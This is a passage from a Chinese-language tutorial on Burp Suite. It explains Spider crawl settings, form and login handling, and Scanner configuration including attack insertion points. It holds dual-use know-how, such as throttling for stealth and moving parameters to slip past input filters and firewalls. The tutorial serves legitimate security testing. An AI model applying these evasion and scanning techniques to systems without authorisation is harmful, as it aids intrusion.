上。在你完全地开始自动探索内容之前，使用浏览器对应用程序进行一些手动的映射，是非常可取的。</p>\n<h3 id=\"Control-tab\"><a href=\"#Control-tab\" class=\"headerlink\" title=\"Control tab\"></a>Control tab</h3><p>这个选项是用来开始和停止 Burp Spider，监视它的进度，以及定义 spidering 的范围。</p>\n<h4 id=\"Spider-Status\"><a href=\"#Spider-Status\" class=\"headerlink\" title=\"Spider Status\"></a>Spider Status</h4><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120887420.png\" alt=\"Image041\" title=\"image041.png\"></p>\n<h4 id=\"1-Spider-running\"><a href=\"#1-Spider-running\" class=\"headerlink\" title=\"1)Spider running\"></a>1)Spider running</h4><p>这个是用来开始和停止 Spider。Spider 停止后，它自己不会产生请求，但它会 继续处理通过 Burp Proxy 的响应，并且在 spidering 范围内的新发现的项都会送入请求队列 里，当 Spider 重新启动时，再来请求。这里显示的一些 Spider 进度的指标，让你能看到剩余的内容和工作量的大小。</p>\n<h4 id=\"2-Clear-queues\"><a href=\"#2-Clear-queues\" class=\"headerlink\" title=\"2)Clear queues\"></a>2)Clear queues</h4><p>如果你想改变你工作的优先权，你可以完全地清除当前队列的项目，来让其他 的项目加入队列。注意如果被清除的项目如果还在范围内并且 Spider 的分析器发现有新的 链接到这个项目，那么它们还会加入队列。</p>\n<h4 id=\"Spider-Scope\"><a href=\"#Spider-Scope\" class=\"headerlink\" title=\"Spider Scope\"></a>Spider Scope</h4><p>在这个面板里，你能精确地定义 Spider 的请求范围。最好的方法通常是使用一套广泛的目标范围，默认情况下，蜘蛛会使用该范围。如果您需要定义不同范围的蜘蛛使用，然后选择“Use custom scope(使用自定义范围)”。进一步的配置面板会出现在相同的方式套件范围的目标范围内面板的功能。如果你使用自定义范围并向 Spider 发送不在范围内 的项，则 Burp 会自动更新这个自定义的范围而不是 Suite 范围。</p>\n<h4 id=\"Options-tab\"><a href=\"#Options-tab\" class=\"headerlink\" title=\"Options tab\"></a>Options tab</h4><p>这个选项里包含了许多控制 Burp Spider 动作的选项，如下描述。这些设置在 spider 启 动后还可以修改的，并且这修改对先前的结果也是有效的。例如，如果增加了最大链接深度， 在以前的最大链接深度外的链接如果满足现在的条件，也会加入到请求队列里。</p>\n<h4 id=\"Crawler-Settings\"><a href=\"#Crawler-Settings\" class=\"headerlink\" title=\"Crawler Settings\"></a>Crawler Settings</h4><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120858563.png\" alt=\"Image043\" title=\"image043.png\"></p>\n<h4 id=\"1-check-robots-txt\"><a href=\"#1-check-robots-txt\" class=\"headerlink\" title=\"1)check robots.txt\"></a>1)check robots.txt</h4><p>如果这个选项被选中，Burp Spider会要求和处理robots.txt文件，提取内容链接。这个文件是由机器人排除协议控制的蜘蛛状制剂在互联网上的行为。请注意，注意 Burp Spider不会确认 robots 排除协议。Burp Spider 会列举出目标应用程序的所有内容，请求所有在范围 内的 robots.txt 条目。</p>\n<h4 id=\"2-detect-custom-“not-found”-responses\"><a href=\"#2-detect-custom-“not-found”-responses\" class=\"headerlink\" title=\"2)detect custom “not found” responses\"></a>2)detect custom “not found” responses</h4><p>HTTP协议需要向Web服务器返回404状态码，如果一个请求的资源不存在。然而，许多Web应用程序返回使用不同的状态代码定制为“not found”的网页。如果是这种情况，则使用该选项可以防止误报的网站内容的映射。Burp Spider从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测定制“not found”的回应。</p>\n<h4 id=\"3-ignore-links-to-non-text-content\"><a href=\"#3-ignore-links-to-non-text-content\" class=\"headerlink\" title=\"3)ignore links to non-text content\"></a>3)ignore links to non-text content</h4><p>常常需要推断出在 HTML 上下文里链接到特殊资源的 MIME 类型。例如，带有 IMG 标记的 URL 会返回图像；那些带有 SCRIPT 标记的会返回 JavaScript。 如果这个选项被选中，Spider 不会请求在这个上下文出现的出现的非文本资源。使用这个选 项，会减少 spidering 时间，降低忽略掉感兴趣内容的风险。</p>\n<h4 id=\"4-request-the-root-of-all-directories-如果这个选项被选中，Burp-Spider-会请求所有已确认的目标-范围内的-web-目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的，-这选项将是非常的有用。\"><a href=\"#4-request-the-root-of-all-directories-如果这个选项被选中，Burp-Spider-会请求所有已确认的目标-范围内的-web-目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的，-这选项将是非常的有用。\" class=\"headerlink\" title=\"4)request the root of all directories 如果这个选项被选中，Burp Spider 会请求所有已确认的目标 范围内的 web 目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的， 这选项将是非常的有用。\"></a>4)request the root of all directories 如果这个选项被选中，Burp Spider 会请求所有已确认的目标 范围内的 web 目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的， 这选项将是非常的有用。</h4><h4 id=\"5-make-a-non-parameterised-request-to-each-dynamic-page\"><a href=\"#5-make-a-non-parameterised-request-to-each-dynamic-page\" class=\"headerlink\" title=\"5)make a non-parameterised request to each dynamic page\"></a>5)make a non-parameterised request to each dynamic page</h4><p>如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出添加的站点内容和功能。</p>\n<h4 id=\"6-maximum-link-depth\"><a href=\"#6-maximum-link-depth\" class=\"headerlink\" title=\"6)maximum link depth\"></a>6)maximum link depth</h4><p>这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。</p>\n<h4 id=\"7-Maximum-parameterized-requests-per-URL\"><a href=\"#7-Maximum-parameterized-requests-per-URL\" class=\"headerlink\" title=\"7)Maximum parameterized requests per URL\"></a>7)Maximum parameterized requests per URL</h4><p>请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容，如在URL中的日期参数的日历应用程序。</p>\n<h2 id=\"Passive-Spidering-被动扫描\"><a href=\"#Passive-Spidering-被动扫描\" class=\"headerlink\" title=\"Passive Spidering(被动扫描)\"></a>Passive Spidering(被动扫描)</h2><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120825072.png\" alt=\"Image045\" title=\"image045.png\"></p>\n<h4 id=\"1-passively-spider-as-you-browse\"><a href=\"#1-passively-spider-as-you-browse\" class=\"headerlink\" title=\"1)passively spider as you browse\"></a>1)passively spider as you browse</h4><p>如果这个选项被选中，Burp Suite 会被动地处理所有通过 Burp Proxy 的 HTTP 请求，来确认访问页面上的链接和表格。使用这个选项能让 Burp Spider 建立一个包含应用程序内容的详细画面，甚至此时你仅仅使用浏览器浏览了内容的一个子集，因为所有被访问内容链接到内容都会自动地添加到 Suite 的站点地图上。</p>\n<h4 id=\"2-link-depth-to-associate-with-proxy-requests\"><a href=\"#2-link-depth-to-associate-with-proxy-requests\" class=\"headerlink\" title=\"2)link depth to associate with proxy requests\"></a>2)link depth to associate with proxy requests</h4><p>这个选项控制着与通过 Burp Proxy 访问的 web 页面 有关的” link depth”。为了防止 Burp Spider 跟踪这个页面里的所有链接，要设置一个比上面 选项卡里的” maximum link depth”值还高的一个值。</p>\n<h3 id=\"Form-Submission\"><a href=\"#Form-Submission\" class=\"headerlink\" title=\"Form Submission\"></a>Form Submission</h3><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120952125.png\" alt=\"Image047\" title=\"image047.png\"></p>\n<h4 id=\"1-individuate-forms\"><a href=\"#1-individuate-forms\" class=\"headerlink\" title=\"1)individuate forms\"></a>1)individuate forms</h4><p>这个选项是配置个性化的标准(执行 URL，方法，区域，值)。当 Burp Spider 处理这些表格时，它会检查这些标准以确认表格是否是新的。旧的表格不会加入到提交序列。</p>\n<h4 id=\"2-Don’t-submit\"><a href=\"#2-Don’t-submit\" class=\"headerlink\" title=\"2)Don’t submit\"></a>2)Don’t submit</h4><p>如果选中这个，Burp Spider 不会提交任何表单。</p>\n<h4 id=\"3-prompt-for-guidance\"><a href=\"#3-prompt-for-guidance\" class=\"headerlink\" title=\"3)prompt for guidance\"></a>3)prompt for guidance</h4><p>如果选中这个，在你提交每一个确认的表单前，Burp Suite 都会为你指示引导。这允许你根据需要在输入域中填写自定义的数据，以及选项提交到服务器的哪一个 区域，以及是否遍历整个区域。</p>\n<h4 id=\"4-automatically-submit\"><a href=\"#4-automatically-submit\" class=\"headerlink\" title=\"4)automatically submit\"></a>4)automatically submit</h4><p>如果选中，Burp Spider 通过使用定义的规则来填写输入域的文本值来自动地提交范围内的表单。每一条规则让你指定一个简单的文本或者正则表达式来匹配表单字段名，并提交那些表单名匹配的字段值。可以为任意不匹配的字段指定默认值。</p>\n<p>在应用程序通常需要对所有输入域都是有效格式的数据的地方，如果你想通过登记表单 和相似功能自动地 spider，则这个选项会非常有用。在自动地把表单数据提交到广阔范围内 的应用程序时，Burp 使用一组非常成功的规则。当然，如果你遇到有自己需要提交的特定 值的表单字段名时，你可以修改这些或者添加自己的规则。你要小心地使用这个选项，因为 提交了表单里的虚假值有时会导致一些不希望看到操作。</p>\n<p>许多表单包含了多个提交元素，这些会对应用程序进行不同的操作，和发现不同的内容。 你可以配置 Spider 重复通过表单里提交元素的值，向每个表单提交多次，次数低于配置的 最大值。</p>\n<h3 id=\"Application-Login\"><a href=\"#Application-Login\" class=\"headerlink\" title=\"Application Login\"></a>Application Login</h3><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120998771.png\" alt=\"Image049\" title=\"image049.png\"></p>\n<p>登陆表单在应用程序中扮演一个特殊角色，并且你常常会让 Burp 用和处理平常表单不 一样的方式来处理这个表单。使用这个配置，你可以告诉 Spider 在遇到一个表单执行下面 4 种不同操作的一种：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.如果你没有证书，或者关注 Spidering 的敏感保护功能，Burp 可以忽略登陆表单。</span><br><span class=\"line\">2.Burp 能交互地为你提示引导，使你能够指定证书。这时默认设置项。</span><br><span class=\"line\">3.Burp 通过你配置的信息和自动填充规则，用处理其他表单的方式来处理登陆表单。</span><br><span class=\"line\">4.在遇到的每个登陆表单时，Burp 能自动地提交特定的证书。 </span><br></pre></td></tr></table></figure>\n\n<p>在最后一种情况下，任何时间 Burp 遇到一个包含密码域的表单，会提交你配置的密码到密码域，提交你配置用户名到最像用户名的字段域。如果你有应用程序的证书，想让 Spider为你处理登陆，通常情况下这是最好的选项</p>\n<h3 id=\"Spider-Engine\"><a href=\"#Spider-Engine\" class=\"headerlink\" title=\"Spider Engine\"></a>Spider Engine</h3><p><img src=\"https://wooyun.js.org/images_result/images/2014101711121055065.png\" alt=\"Image051\" title=\"image051.png\"></p>\n<p>这些设置控制用于Spidering时发出HTTP请求的引擎。下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)Number of threads----此选项控制并发请求进程数。</span><br><span class=\"line\">2)Number of retries on network failure----如果出现连接错误或其他网络问题，BurpSuite会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。</span><br><span class=\"line\">3)Pause before retry----当重试失败的请求，BurpSuite会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器被宕掉、繁忙或间歇性的问题发生，最好是等待很短的时间，然后重试。</span><br><span class=\"line\">4)Throttle between requests----BurpSuite可以在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。</span><br><span class=\"line\">5)Add random variations to throttle----此选项可以通过降低您的要求的时序模式进一步增加隐身。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Request-Headers\"><a href=\"#Request-Headers\" class=\"headerlink\" title=\"Request Headers\"></a>Request Headers</h3><p>这些设置控制由蜘蛛发出的HTTP请求中使用的请求头。您可以配置头蜘蛛在请求中使用的自定义列表。这可能是有用的，以满足各个应用程序的特定要求 - 例如，测试设计用于移动设备的应用程序时，以模拟预期的用户代理。</p>\n<p>以下选项也可用：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121061095.png\" alt=\"Image053\" title=\"image053.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)Use HTTP version 1.1----如果选中，Spider会使用HTTP1.1版在其请求;否则，它会使用1.0版。</span><br><span class=\"line\"></span><br><span class=\"line\">2)Use Referer header----如果选中，Spider会要求从另一个页面链接到任何项目时提交相关Referer头。此选项很有用更加紧密地模拟将通过您的浏览器发出的请求，并且还可能需要浏览一些应用程序验证Referer头。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Scanner功能\"><a href=\"#Scanner功能\" class=\"headerlink\" title=\"Scanner功能\"></a>Scanner功能</h2><h3 id=\"Using-Burp-Scanner\"><a href=\"#Using-Burp-Scanner\" class=\"headerlink\" title=\"Using Burp Scanner\"></a>Using Burp Scanner</h3><p>分以下几个步骤来简单使用Scanner 1.设置好代理之后在地址栏输入你要抓取的地址，并且要在Proxy里把拦截关了，随后切换到Scanner的Results就可以看到地址已经在开始扫描咯</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121128756.png\" alt=\"Image055\" title=\"image055.png\"></p>\n<p>2.对地址右击还可以导出报告，</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121157380.png\" alt=\"Image057\" title=\"image057.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121141522.png\" alt=\"Image059\" title=\"image059.png\"></p>\n<p>Html或者xml随便你以什么格式的，然后一直下一步下一步到如下图选择保存文件到哪</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121154576.png\" alt=\"Image061\" title=\"image061.png\"></p>\n<p>我们打开看看，是不是很漂亮呢</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121194134.png\" alt=\"Image063\" title=\"image063.png\"></p>\n<p>3.如果扫描出漏洞了我们还可以直接在这针对某个漏洞进行查看，如果想测试的话可以发送到Repeater进行测试哦</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121260493.png\" alt=\"Image065\" title=\"image065.png\"></p>\n<h3 id=\"Results\"><a href=\"#Results\" class=\"headerlink\" title=\"Results\"></a>Results</h3><p>结果选项卡包含所有的扫描仪已确定，从主动和被动扫描的问题。以一种树型图显示应用程序的内容，其中的问题已经被发现，使用URL分解成域，目录和文件的层次表示。如果您选择一个或多个部分的分支，所有选定的项目将扫描的问题都列出来，用组合在一起的相同类型的问题。您还可以扩大这些问题汇总查看所有的每种类型的个别问题。 如果您选择的问题那么将显示相应的详情，包括：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)自定义的漏洞，咨询内容包括：</span><br><span class=\"line\">问题类型及其整治的标准描述。</span><br><span class=\"line\">中适用于该问题，并影响其修复任何特定的功能的描述。</span><br><span class=\"line\">2)完整的请求和响应都是依据报告了该问题。在适用的情况，是相关的识别和再现问题的请求和响应的部分在请求和响应消息的编辑器中突出显示。</span><br></pre></td></tr></table></figure>\n\n<p>通常情况下，测试并验证一个问题最快的方法是使用发送到Repeater。另外，对于GET请求，您可以复制此URL，并将其粘贴到浏览器中。然后，您可以重新发出请求。 Burp扫描报告描述，每一个问题都会给出严重程度（高，中，低，资讯）和置信度（肯定的，坚定的，暂定）的评级。当一个问题一直使用一种技术，本质上是不太可靠（如SQL盲注）确定，Burp会让你意识到这一点，通过丢弃的置信水平存在一定不足。这些额定值应始终被解释为指示性的，你应该根据你的应用程序的功能和业务方面的知识进行审查。</p>\n<p>这个问题已经上市，你可以用它来执行以下操作的上下文菜单：如图所示</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121228957.png\" alt=\"Image067\" title=\"image067.png\"></p>\n<h3 id=\"Report-selected-issues\"><a href=\"#Report-selected-issues\" class=\"headerlink\" title=\"Report selected issues\"></a>Report selected issues</h3><p>启动BurpSuite Scanner的报告向导，生成的选定问题的正式报告。 Set severity - 这让你重新分配问题的严重程度。您可以设置严重程度高，中，低，或信息。您还可以标记问题作为假阳性。</p>\n<h3 id=\"Delect-selected-issues\"><a href=\"#Delect-selected-issues\" class=\"headerlink\" title=\"Delect selected issues\"></a>Delect selected issues</h3><p>删除选定问题。请注意，如果你删除了一个问题，Burp重新发现了同样的问题（例如，如果你重新扫描了同样的要求），那么问题将再次报告。相反，如果你是一个假阳性标记的问题，那么这将不会发生。因此，最适合用于清理扫描结果移除你不感兴趣。对于内部的功能不需要您的问题仍然工作在主机或路径删除的问题，您应该使用假阳性的选项。</p>\n<h3 id=\"Scan-Queue\"><a href=\"#Scan-Queue\" class=\"headerlink\" title=\"Scan Queue\"></a>Scan Queue</h3><p>Active Scanning(主动扫描)过程通常包括发送大量请求到服务器为所扫描的每个基本的请求，这可能是一个耗时的过程。当您发送的主动扫描请求，这些被添加到活动扫描队列，它们被依次处理。如图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121261155.png\" alt=\"Image069\" title=\"image069.png\"></p>\n<p>扫描队列中显示每个项目的详细信息如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)索引号的项目，反映该项目的添加顺序。</span><br><span class=\"line\">2)目的地协议，主机和URL 。</span><br><span class=\"line\">3)该项目的当前状态，包括完成百分比。</span><br><span class=\"line\">4)项目扫描问题的数量（这是根据所附的最严重问题的重要性和彩色化） 。</span><br><span class=\"line\">5)在扫描项目的请求数量进行。</span><br><span class=\"line\">注意 这不是插入点的数量的线性函数 - 观察应用程序行为的反馈到后续攻击的请求，仅仅因为它会为一个测试仪。</span><br><span class=\"line\">6)网络错误的数目遇到的问题。</span><br><span class=\"line\">7)为项目创建的插入点的数量。</span><br></pre></td></tr></table></figure>\n\n<p>这些信息可以让您轻松地监控个别扫描项目的进度。如果您发现某些扫描进度过于缓慢，可以理解的原因，如大量的插入点，缓慢的应用响应，网络错误等给定这些信息，你就可以采取行动来优化你的扫描，通过改变配置为插入点时，扫描引擎，或正在测试的主动扫描区域。</p>\n<p>你可以双击任何项目在扫描队列显示，到目前为止发现的问题，并查看了基本请求和响应的项目。您可以使用扫描队列的上下文菜单来执行各种操作来控制扫描过程。确切的可用选项取决于所选的项目（S ）的状态，并包括：如下图所示</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121223207.png\" alt=\"Image071\" title=\"image071.png\"></p>\n<h3 id=\"Show-details\"><a href=\"#Show-details\" class=\"headerlink\" title=\"Show details\"></a>Show details</h3><p>这将打开显示到目前为止发现的问题的一个窗口，与底座请求和响应的项目。</p>\n<h3 id=\"Scan-again\"><a href=\"#Scan-again\" class=\"headerlink\" title=\"Scan again\"></a>Scan again</h3><p>此复制所选择的项目（S ） ，并将这些队列的末尾。</p>\n<h3 id=\"Delete-item-S\"><a href=\"#Delete-item-S\" class=\"headerlink\" title=\"Delete item(S)\"></a>Delete item(S)</h3><p>这将永久地从队列中删除选定的项目（S ） 。</p>\n<h3 id=\"Delect-finished-items\"><a href=\"#Delect-finished-items\" class=\"headerlink\" title=\"Delect finished items\"></a>Delect finished items</h3><p>这永久删除那些已经完成了队列中的任何项目。</p>\n<h3 id=\"Automatically-delete-finished-items\"><a href=\"#Automatically-delete-finished-items\" class=\"headerlink\" title=\"Automatically delete finished items\"></a>Automatically delete finished items</h3><p>这是否切换扫描器会自动从队列为他们完成删除项目。</p>\n<h3 id=\"Pause-resume-scanner\"><a href=\"#Pause-resume-scanner\" class=\"headerlink\" title=\"Pause&#x2F;resume scanner\"></a>Pause&#x2F;resume scanner</h3><p>这可以暂停和恢复激活扫描仪。如果任何扫描正在进行时，扫描会暂停，而挂起的扫描请求完成后，通常会有一个短暂的延迟。</p>\n<h3 id=\"Send-to\"><a href=\"#Send-to\" class=\"headerlink\" title=\"Send to\"></a>Send to</h3><p>这些选项用于所选项目的基本请求发送到其它Burp(Repeater、Intruder)工具。</p>\n<h3 id=\"Live-Scanning\"><a href=\"#Live-Scanning\" class=\"headerlink\" title=\"Live Scanning\"></a>Live Scanning</h3><p>实时扫描可让您决定哪些内容通过使用浏览器的目标应用，通过BurpProxy服务器进行扫描。您可以实时主动扫描设定live active scanning和live passive两种扫描模式。如图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121272043.png\" alt=\"Image073\" title=\"image073.png\"></p>\n<h3 id=\"Live-active-scanning\"><a href=\"#Live-active-scanning\" class=\"headerlink\" title=\"Live active scanning\"></a>Live active scanning</h3><p>执行现场主动扫描，请执行以下步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)配置与目标的细节，你要主动扫描现场主动扫描设置。如果你已经配置了一套全范围的目标为你目前的工作，那么你可以简单地通知Burp主动扫描落在该范围内的每个请求。或者，您可以使用URL匹配规则定义自定义范围。 </span><br><span class=\"line\">2)各地通过BurpProxy通常的方式应用浏览。这将有效地展示Burp要扫描的应用功能。对于每一个独特的所在范围的要求，你通过你的浏览器，Burp会排队主动扫描请求，并将努力走在后台找到漏洞为您服务。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Live-Passive-Scanning\"><a href=\"#Live-Passive-Scanning\" class=\"headerlink\" title=\"Live Passive Scanning\"></a>Live Passive Scanning</h3><p>现场演示被动扫描，请执行以下步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)配置具有您要被动地扫描目标的细节live passive scanning。默认情况下，Burp执行所有请求的被动扫描，但你可以限制扫描目标范围，或者使用URL匹配规则的自定义范围。 </span><br><span class=\"line\">2)通过BurpProxy通常的方式应用浏览。这将有效地展示Burp你要扫描的应用功能。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Options-1\"><a href=\"#Options-1\" class=\"headerlink\" title=\"Options\"></a>Options</h3><p>此选项卡包含Burp扫描选项进行攻击的插入点，主动扫描引擎，主动扫描优化，主动扫描区和被动扫描区域。</p>\n<h3 id=\"Attack-Insertion-Points\"><a href=\"#Attack-Insertion-Points\" class=\"headerlink\" title=\"Attack Insertion Points\"></a>Attack Insertion Points</h3><p>这些设置控制扫描仪的地方“插入点(insertion points)”到被发送的主动扫描每个基本要求。插入点攻击将被放置，探测漏洞请求中的位置。每个定义的插入点单独扫描。 BurpSuite为您提供细粒度地控制放置插入点，以及这些选项仔细配置会让您量身定制您的扫描到您的目标应用程序的性质。插入点的配置也代表你的扫描速度和全面性之间进行权衡。</p>\n<p>注：除了让Burp自动指定插入点，就可以完全自定义这些，这样你就可以在你想要攻击的地方放在任意一个位置。要使用此功能，将请求发送给Intruder，用payload positions标签来定义通常的方式各插入点的开始和结束，并选择入侵者菜单选项“积极定义扫描插入点” 。您也可以指定以编程方式使用Burp扩展的自定义插入点位置。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121335428.png\" alt=\"Image075\" title=\"image075.png\"></p>\n<h4 id=\"1-Insertion-Point-Locations\"><a href=\"#1-Insertion-Point-Locations\" class=\"headerlink\" title=\"1)Insertion Point Locations\"></a>1)Insertion Point Locations</h4><p>这些设定可让您选择，其中插入点应放在请求中的位置的类型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URLparameter values - URL查询字符串中标准的参数值。</span><br><span class=\"line\">Body parameter values - 在邮件正文中，包括标准形式生成的参数参数值，属性的多重编码的参数，如上传的文件名， XML参数值和属性，和JSON值。</span><br><span class=\"line\">Cookieparameter values - 的HTTP Cookie的值。</span><br><span class=\"line\">Parameter name - 任意添加的参数的名称。 URL参数总是被添加，并且机身参数也加入到POST请求。测试一个附加的参数名称通常可以检测到被错过，如果只是参数值进行了测试异常的错误。</span><br><span class=\"line\">HTTPheaders - 在引用页和用户代理标头的值。测试这些插入点通常可以检测如SQL注入或跨站脚本持续在日志记录功能的问题。</span><br><span class=\"line\">AMF string parameters- 内AMF编码的邮件的任何字符串数据的值。</span><br><span class=\"line\">REST-style URL parameters - URL的文件路径部分中的所有目录和文件名令牌的值。测试每一个插入点可以并处显著开销，如果你相信应用程序使用这些位置传送参数数据，才应使用。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-Change-Parameter-Locations\"><a href=\"#2-Change-Parameter-Locations\" class=\"headerlink\" title=\"2)Change Parameter Locations\"></a>2)Change Parameter Locations</h4><p>允许您配置扫描仪将一些类型的插入点到其他地点的请求中，除了测试他们在原来的位置。例如，您可以将每个URL参数到邮件正文中，并重新测试它。或者你可以移动身体的每个参数到一个cookie ，然后重新测试它。</p>\n<p>用这种移动参数方式往往可以绕过防过滤器。许多应用程序和应用程序防火墙执行每个参数输入验证假设每个参数是它的预期位置的要求之内。移动参数到不同的位置可以回避这个验证。当应用程序代码后检索参数来实现其主要的逻辑，它可能会使用一个API，它是不可知的，以参数的位置。如果是这样，那么移动的参数可能可以使用输入，通常会在处理之前被过滤，以达到易受攻击的代码路径。</p>\n<p>下列选项可用于更改参数的位置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL to body</span><br><span class=\"line\">URL to cookie</span><br><span class=\"line\">Body to URL</span><br><span class=\"line\">Body to cookie</span><br><span class=\"line\">Cookie to URL</span><br><span class=\"line\">Cookie to body</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-Nested-Insertion-Points\"><a href=\"#3-Nested-Insertion-Points\" class=\"headerlink\" title=\"3)Nested Insertion Points\"></a>3)Nested Insertion Points</h4><p>嵌套的插入时，会使用一个插入点的基值包含可识别的格式的数据。 例如，一个URL参数可能包含Base64编码数据，并且将解码后的值可能又包含JSON或XML数据。与使用启用嵌套插入点的选项，Burp会为输入在每个嵌套级别中的每个单独的项目适合的插入点。 Spider仅包含常规的请求参数请求时使用此选项不征收费用，但允许Burp达到更复杂的应用，数据是在不同的格式封装的攻击面。</p>\n<h4 id=\"4-Maximum-Insertion-Points-Per-Request\"><a href=\"#4-Maximum-Insertion-Points-Per-Request\" class=\"headerlink\" title=\"4)Maximum Insertion Points Per Request\"></a>4)Maximum Insertion Points Per Request</h4><p>无论你的设置选择，对于单个请求插入点的数目，一般视乎该请求的功能，如参数的数目。偶尔，请求可以包含的参数（几百或更多）数量。如果Burp执行的每个参数进行完全扫描，扫描会花费过多的时间量完成。 此设置允许您设置的，将每个基本要求生成插入点的数量的限制，从而防止您的扫描由偏快转为停滞，如果他们遇到含参数庞大的数字请求。在其中插入点的数量是由这个限制缩减的情况下，在有效扫描队列中的项目的条目将显示被跳过的插入点的数量，使您能够手动检查基本要求，并决定是否值得执行完全扫描其所有可能的插入点。</p>\n<h4 id=\"5-Skipping-Parameters\"><a href=\"#5-Skipping-Parameters\" class=\"headerlink\" title=\"5)Skipping Parameters\"></a>5)Skipping Parameters</h4><p>设定让您指定请求参数的Burp应该跳过某些测试。有跳过服务器端注入测试（如SQL注入）和跳过所有检查单独的列表。 服务器端注入测试是比较费时的，因为Burp发送多个请求探测服务器上的各种盲目的漏洞。如果您认为出现请求中的某些参数不容易（例如，内置仅由平台或Web服务器中使用的参数） ，你可以告诉Burp不能测试这些。 （用于测试客户端蝽象跨站点脚本涉及更少的开销，因为测试每个参数规定最小的开销在扫描期间，如果该参数不容易。 ） 如果一个参数是由您不希望测试一个应用程序组件来处理，或者修改一个参数是已知的导致应用程序不稳定跳过所有的测试可能是有用的。 列表中的每个项目指定参数类型，该项目要匹配（名称或值） ，匹配类型（文本字符串或正则表达式） ，表达式匹配。 你可以通过它们的位置（斜线分隔）的URL路径中标识的REST参数。要做到这一点，从参数下拉，“姓名”，从项目下拉“ REST参数” ，并指定您希望从测试中排除的URL路径中的位置的索引号（从1开始） 。您还可以通过值来指定REST参数。</p>\n<h3 id=\"Active-Scanning-Engine\"><a href=\"#Active-Scanning-Engine\" class=\"headerlink\" title=\"Active Scanning Engine\"></a>Active Scanning Engine</h3><p>控制用来做主动扫描时发出HTTP请求的引擎。下列选项可用：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121391377.png\" alt=\"Image077\" title=\"image077.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 